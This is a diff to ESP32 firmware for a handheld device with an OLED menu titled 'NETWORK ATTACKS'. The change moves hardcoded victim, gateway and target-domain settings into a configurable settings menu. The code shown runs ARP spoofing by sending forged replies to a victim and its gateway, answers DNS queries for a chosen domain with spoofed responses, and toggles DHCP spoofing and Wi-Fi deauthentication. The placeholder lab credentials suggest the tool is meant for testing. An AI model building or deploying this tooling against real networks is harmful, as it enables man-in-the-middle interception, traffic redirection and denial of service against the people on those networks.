@@ -22,31 +22,20 @@
 #include "forwarding.h"
 #include "dhcp_utils.h"
 #include "deauth_utils.h"
+#include "settings_manager.h"
+#include "settings_menu.h"
 
 #define LED_PIN 2
-
-// ===== CONFIGURATION =====
-const char* WIFI_SSID     = "YOUR_LAB_SSID";
-const char* WIFI_PASS     = "YOUR_LAB_PASSWORD";
-uint8_t VICTIM_MAC[6]     = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-IPAddress VICTIM_IP(192, 168, 1, 100);
-uint8_t GATEWAY_MAC[6]    = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-IPAddress GATEWAY_IP(192, 168, 1, 1);
-const char* TARGET_DOMAIN = "example.com";
-IPAddress SPOOFED_IP(192, 168, 1, 200);
-int ARP_INTERVAL_MS = 2000;
 
 // ===== Globals =====
 uint8_t g_esp32_mac[6];
 IPAddress g_esp32_ip;
 uint8_t g_bssid[6];
-char TARGET_DOMAIN_STR[64];
 
 static bool arpOn = false, dnsOn = false, dhcpOn = false, deauthOn = false;
 static int arpCount = 0, dnsCount = 0, dhcpCount = 0;
 int deauthCount = 0;  // Non-static so deauth_utils.cpp can increment it
 static int cursor = 0;
-static bool showStatus = false;
 static unsigned long lastArp = 0, lastRender = 0, ledOffTime = 0;
 
 #define MAX_PKT 512
@@ -54,6 +43,9 @@ static unsigned long lastArp = 0, lastRender = 0, ledOffTime = 0;
 struct PktItem { uint16_t len; uint8_t data[MAX_PKT]; };
 static PktItem pktQ[QLEN];
 static volatile int qW = 0, qR = 0;
+
+enum Screen { SCR_MAIN, SCR_STATUS, SCR_SETTINGS };
+static Screen currentScreen = SCR_MAIN;
 
 void IRAM_ATTR promCb(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
@@ -77,15 +69,14 @@ void setup() {
     pinMode(LED_PIN, OUTPUT);
     digitalWrite(LED_PIN, LOW);
     
-    strlcpy(TARGET_DOMAIN_STR, TARGET_DOMAIN, 64);
-    
     displayInit();
     inputInit();
+    settingsInit();
     
     WiFi.mode(WIFI_STA);
     WiFi.setSleep(false);
     esp_wifi_set_ps(WIFI_PS_NONE);
-    WiFi.begin(WIFI_SSID, WIFI_PASS);
+    WiFi.begin(g_wifi_ssid, g_wifi_pass);
     
     int attempts = 0;
     while (WiFi.status() != WL_CONNECTED && attempts < 20) { delay(500); attempts++; }
@@ -120,28 +111,28 @@ void loop() {
         if (evt == EVT_UP) Serial.println("UP");
         if (evt == EVT_DOWN) Serial.println("DOWN");
         if (evt == EVT_SELECT) Serial.println("SELECT");
+        if (evt == EVT_BACK) Serial.println("BACK");
     }
     if (now > ledOffTime && digitalRead(LED_PIN) == HIGH) {
         digitalWrite(LED_PIN, LOW);
     }
     
     // Input handling
-    if (!showStatus) {
+    if (currentScreen == SCR_MAIN) {
         if (evt == EVT_UP && cursor > 0) cursor--;
-        if (evt == EVT_DOWN && cursor < 4) cursor++;
+        if (evt == EVT_DOWN && cursor < 5) cursor++;
         if (evt == EVT_SELECT) {
             if (cursor == 0) arpOn = !arpOn;
             if (cursor == 1) dnsOn = !dnsOn;
             if (cursor == 2) { dhcpOn = !dhcpOn; if (dhcpOn) dhcpStart(); else dhcpStop(); }
             if (cursor == 3) {
-                // FIX: guard deauth if BSSID is invalid
                 if (!deauthOn) {
                     bool bssidValid = false;
                     for (int i = 0; i < 6; i++) {
                         if (g_bssid[i] != 0) { bssidValid = true; break; }
                     }
                     if (!bssidValid) {
-                        Serial.println("[!] Cannot start deauth: BSSID unknown (WiFi not connected)");
+                        Serial.println("[!] Cannot start deauth: BSSID unknown");
                     } else {
                         deauthOn = true;
                         deauthStart();
@@ -151,17 +142,26 @@ void loop() {
                     deauthStop();
                 }
             }
-            if (cursor == 4) showStatus = true;
+            if (cursor == 4) { currentScreen = SCR_SETTINGS; settingsMenuOpen(); }
+            if (cursor == 5) currentScreen = SCR_STATUS;
         }
-    } else {
-        if (evt == EVT_SELECT || evt == EVT_UP || evt == EVT_DOWN) showStatus = false;
+    } else if (currentScreen == SCR_STATUS) {
+        if (evt == EVT_SELECT || evt == EVT_UP || evt == EVT_DOWN || evt == EVT_BACK) {
+            currentScreen = SCR_MAIN;
+        }
+    } else if (currentScreen == SCR_SETTINGS) {
+        if (!settingsMenuIsActive()) {
+            currentScreen = SCR_MAIN;
+        } else {
+            settingsMenuUpdate(evt);
+        }
     }
     
     // ARP spoofing
-    if (arpOn && now - lastArp >= (unsigned long)ARP_INTERVAL_MS) {
+    if (arpOn && now - lastArp >= (unsigned long)g_arp_interval_ms) {
         lastArp = now;
-        sendArpReply(VICTIM_MAC, GATEWAY_IP, g_esp32_mac, VICTIM_IP);
-        sendArpReply(GATEWAY_MAC, VICTIM_IP, g_esp32_mac, GATEWAY_IP);
+        sendArpReply(g_victim_mac, g_gateway_ip, g_esp32_mac, g_victim_ip);
+        sendArpReply(g_gateway_mac, g_victim_ip, g_esp32_mac, g_gateway_ip);
         arpCount++;
     }
     
@@ -176,8 +176,11 @@ void loop() {
     // Render
     if (now - lastRender > 50) {
         lastRender = now;
-        if (!showStatus) renderMain();
-        else renderStatus();
+        switch (currentScreen) {
+            case SCR_MAIN: renderMain(); break;
+            case SCR_STATUS: renderStatus(); break;
+            case SCR_SETTINGS: settingsMenuRender(); break;
+        }
     }
     
     delay(5);
@@ -204,8 +207,8 @@ void processPkt(uint8_t* data, uint16_t len) {
     uint16_t ipLen = (ip[2]<<8)|ip[3];
     uint8_t ipHdr = (ip[0]&0x0F)*4;
     
-    bool fromVic = !memcmp(a3, VICTIM_MAC, 6);
-    bool fromGw = !memcmp(a3, GATEWAY_MAC, 6);
+    bool fromVic = !memcmp(a3, g_victim_mac, 6);
+    bool fromGw = !memcmp(a3, g_gateway_mac, 6);
     
     if (fromVic) {
         if (prot == 17 && ipHdr + 8 <= ipLen) {
@@ -215,8 +218,8 @@ void processPkt(uint8_t* data, uint16_t len) {
             if (dport == 53 && ulen >= 20 && dnsOn) {
                 char dom[64];
                 if (parseDnsQueryDomain(&udp[8], ulen-8, dom, sizeof(dom))) {
-                    if (!strcmp(dom, TARGET_DOMAIN_STR)) {
-                        sendDnsResponse(ip, udp, &udp[8], ulen-8, VICTIM_MAC, g_esp32_mac, g_bssid);
+                    if (!strcmp(dom, g_target_domain)) {
+                        sendDnsResponse(ip, udp, &udp[8], ulen-8, g_victim_mac, g_esp32_mac, g_bssid);
                         dnsCount++; return;
                     }
                 }
@@ -236,15 +239,16 @@ void renderMain() {
     displayClearBuffer();
     displayDrawStr(0, 8, "NETWORK ATTACKS");
     displayDrawLine(0, 10, 127, 10);
-    const char* items[] = {"ARP Spoof", "DNS Spoof", "DHCP Spoof", "Deauth", "Status >"};
-    const char* status[5];
+    const char* items[] = {"ARP Spoof", "DNS Spoof", "DHCP Spoof", "Deauth", "Settings >", "Status >"};
+    const char* status[6];
     status[0] = arpOn ? "ON" : "OFF";
     status[1] = dnsOn ? "ON" : "OFF";
     status[2] = dhcpOn ? "ON" : "OFF";
     status[3] = deauthOn ? "ON" : "OFF";
     status[4] = "";
+    status[5] = "";
     
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 6; i++) {
         int y = 22 + i * 10;
         if (i == cursor) {
             displayDrawBox(0, y - 8, 128, 10);
@@ -265,7 +269,6 @@ void renderStatus() {
     displayDrawLine(0, 10, 127, 10);
     char buf[32];
     
-    // FIX: avoid dangling pointer from temporary String object
     char ipStr[16];
     if (WiFi.status() == WL_CONNECTED) {
         strlcpy(ipStr, WiFi.localIP().toString().c_str(), sizeof(ipStr));
